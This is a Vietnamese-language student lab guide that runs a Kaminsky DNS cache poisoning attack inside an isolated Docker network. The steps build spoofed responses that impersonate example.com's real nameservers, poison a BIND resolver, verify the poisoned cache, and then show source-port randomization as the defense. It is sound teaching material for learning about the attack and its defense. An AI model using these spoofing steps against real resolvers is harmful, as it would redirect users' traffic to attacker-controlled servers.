# HƯỚNG DẪN DEMO LAB 03: DNS CACHE POISONING (KAMINSKY ATTACK)

- Máy Host (Server VM): `192.168.117.13`
- Attacker: `10.2.6.1` (`attacker-10.2.6.1`)
- User: `10.2.6.5` (`user-10.2.6.5`)
- Local DNS Server: `10.2.6.53` (`local-dns-server-10.2.6.53`)
- Attacker Nameserver: `10.2.6.153` (`attacker-ns-10.2.6.153`)

Thư mục dự án trên máy ảo (VirtualBox shared folder / junction tới `src/scripts`):

```text
/media/sf_.shared/scripts/lab03
```

Các script tự động (khai báo biến đầu file, dùng file trong dự án, không gọi script tạo sẵn trên `~/lab03`):

```bash
bash /media/sf_.shared/scripts/lab03/.lab/00_init.sh
bash /media/sf_.shared/scripts/lab03/.lab/01_gen_query.sh
bash /media/sf_.shared/scripts/lab03/.lab/02_gen_response.sh
bash /media/sf_.shared/scripts/lab03/.lab/03_test_attack.sh
bash /media/sf_.shared/scripts/lab03/.lab/04_test_defense.sh
```

---

## GIAI ĐOẠN 0: DỰNG MÔI TRƯỜNG

Lab 03 dùng subnet `10.2.6.0/24` (trùng Lab 02). Tắt Lab 02 trước. Xóa default route Host qua `192.168.117.2` nếu có, để container DNS ra Internet qua NIC còn lại.

```bash
sudo ip route del default via 192.168.117.2 2>/dev/null || true
cd /media/sf_.shared/scripts/lab02
sudo docker compose down 2>/dev/null || true
cd /media/sf_.shared/scripts/lab03
sudo docker compose build local-server
sudo docker compose up -d --force-recreate
sudo docker ps
```

*(Yêu cầu: 4 container Up. Local DNS phải có `query-source port 44444;` và `send-cookie no;` trong `/etc/bind/named.conf.options` của image dự án.)*

---

## 4.1. TRIỂN KHAI HỆ THỐNG

### 1. Kiểm tra kết nối mạng

```bash
sudo docker exec user-10.2.6.5 ping -c 2 10.2.6.53
sudo docker exec user-10.2.6.5 ping -c 2 10.2.6.153
sudo docker exec user-10.2.6.5 ping -c 2 10.2.6.1
```

### 2. Dig ban đầu từ User

```bash
sudo docker exec user-10.2.6.5 dig ns.attacker32.com
sudo docker exec user-10.2.6.5 dig www.example.com
sudo docker exec user-10.2.6.5 dig @ns.attacker32.com www.example.com
```

*(Kỳ vọng: `ns.attacker32.com` → `10.2.6.153`; `www.example.com` qua Local DNS trả IP thật Cloudflare; truy vấn trực tiếp Attacker NS trả `1.2.3.5`.)*

### 3. (Tuỳ chọn) Bắt gói trên bridge Host

```bash
BR_IF=$(sudo docker network inspect seed-net -f '{{.Id}}' | head -c 12 | awk '{print "br-"$1}')
echo "Bridge interface: $BR_IF"
sudo dumpcap -i "$BR_IF" -w /tmp/task1_prep.pcap -q >/dev/null 2>&1 &
sleep 2
sudo pkill -INT -x dumpcap 2>/dev/null || true
```

---

## 4.2. TẠO DNS QUERY (`ip_req.bin`)

```bash
sudo docker exec attacker-10.2.6.1 bash -c 'cd /attack && python3 gen_query.py && ls -la ip_req.bin'
ls -lh /media/sf_.shared/scripts/lab03/attack/ip_req.bin
```

*(File nằm trong thư mục `attack` của dự án nhờ volume mount. Nội dung: src `10.2.6.1:12345` → dst `10.2.6.53:53`, QNAME mẫu `twysw.example.com`.)*

---

## 4.3. TẠO DNS RESPONSE GIẢ MẠO (`ip_resp*.bin`)

IP nameserver thật của `example.com` đổi theo thời điểm. Không ghi cứng một IP; phát hiện rồi sinh nhiều mẫu:

```bash
sudo docker exec local-dns-server-10.2.6.53 bash -c '
for ns in $(dig +short NS example.com @8.8.8.8); do
  dig +short A "$ns" @8.8.8.8
done' | sort -u
```

```bash
sudo docker exec attacker-10.2.6.1 bash -c 'cd /attack && rm -f ip_resp*.bin'
# Ví dụ một IP (hera.ns.cloudflare.com thường gồm 108.162.192.162):
sudo docker exec attacker-10.2.6.1 bash -c 'cd /attack && python3 gen_response.py 108.162.192.162 ip_resp.bin'
# Lặp tương tự cho mọi NS A record -> ip_resp_0.bin, ip_resp_1.bin, ...
ls -lh /media/sf_.shared/scripts/lab03/attack/ip_resp*.bin
```

*(Response spoof: src = IP NS thật, sport 53, dst `10.2.6.53:44444`, Authority `example.com NS ns.attacker32.com`, Additional `ns.attacker32.com A 10.2.6.153`.)*

---

## 4.4. TẤN CÔNG KAMINSKY

Cách ổn định trên BIND 9.16 (script `03_attack.sh`):

1. `query-source port 44444;` + `send-cookie no;` (nap lại từ `image_local_dns_server/named.conf.options`).
2. `rp_filter=0` trong netns Local DNS; iptables INPUT: DROP trả lời UDP sport 53 từ mọi IP NS thật **trừ** MAC Attacker.
3. `rndc flushtree example.com` trước mỗi vòng (BIND không thay NS đã cache nếu còn Cloudflare NS).
4. Sniff outbound bằng `nsenter` + `sniff_spoof.py` (tcpdump sidecar Docker thường không thấy gói named); gửi hit UDP tới Attacker:39099.
5. `hit_sender.py` (Scapy) spoof đúng TXID + dport; không flood `attack.c` trên đường chạy chính (dễ treo máy).
6. Pcap ghi `/tmp` trong container rồi `docker cp` ra `volumes/` (tránh lỗi ghi vboxsf).

Chạy một lệnh:

```bash
bash /media/sf_.shared/scripts/lab03/.lab/03_test_attack.sh
```

*(Kỳ vọng trong vài giây: `www.example.com` → `1.2.3.5`; dump cache có `example.com NS ns.attacker32.com.`.)*

### Biên dịch `attack.c` (báo cáo / chạy tay)

```bash
gcc -O2 -static /media/sf_.shared/scripts/lab03/attack/attack.c -o /tmp/lab03_attack
sudo docker cp /tmp/lab03_attack attacker-10.2.6.1:/attack/attack
sudo docker exec attacker-10.2.6.1 chmod +x /attack/attack
```

### Kiểm tra kết quả thủ công

```bash
sudo docker exec user-10.2.6.5 dig www.example.com
sudo docker exec local-dns-server-10.2.6.53 rndc dumpdb -cache
sudo docker exec local-dns-server-10.2.6.53 grep -E '^example.com|attacker32' /var/cache/bind/dump.db | head -40
ls -lh /media/sf_.shared/scripts/lab03/volumes/*.pcap
```

---

## 4.5. PHÒNG CHỐNG (SOURCE PORT RANDOMIZATION)

```bash
sudo docker exec local-dns-server-10.2.6.53 sed -i '/query-source port 44444;/d' /etc/bind/named.conf.options
sudo docker exec local-dns-server-10.2.6.53 named-checkconf
sudo docker exec local-dns-server-10.2.6.53 rndc reconfig
sudo docker exec local-dns-server-10.2.6.53 rndc flush
sudo docker exec user-10.2.6.5 dig www.example.com
```

*(Kỳ vọng: IP thật trở lại. Gói giả mạo vẫn nhắm cổng 44444 nên không còn khớp cổng nguồn ngẫu nhiên.)*

Khôi phục cổng cố định: chạy lại `00_init.sh` (recreate Local DNS từ image dự án).

---

## ĐÓNG GÓI BÀI NỘP

```bash
cd /media/sf_.shared/scripts/lab03/volumes
cp -f ../attack/attacker.pcap ./
zip -q Nhom6_Lab03_BaoCao.zip attacker.pcap local_dns_server.pcap
ls -lh Nhom6_Lab03_BaoCao.zip
```
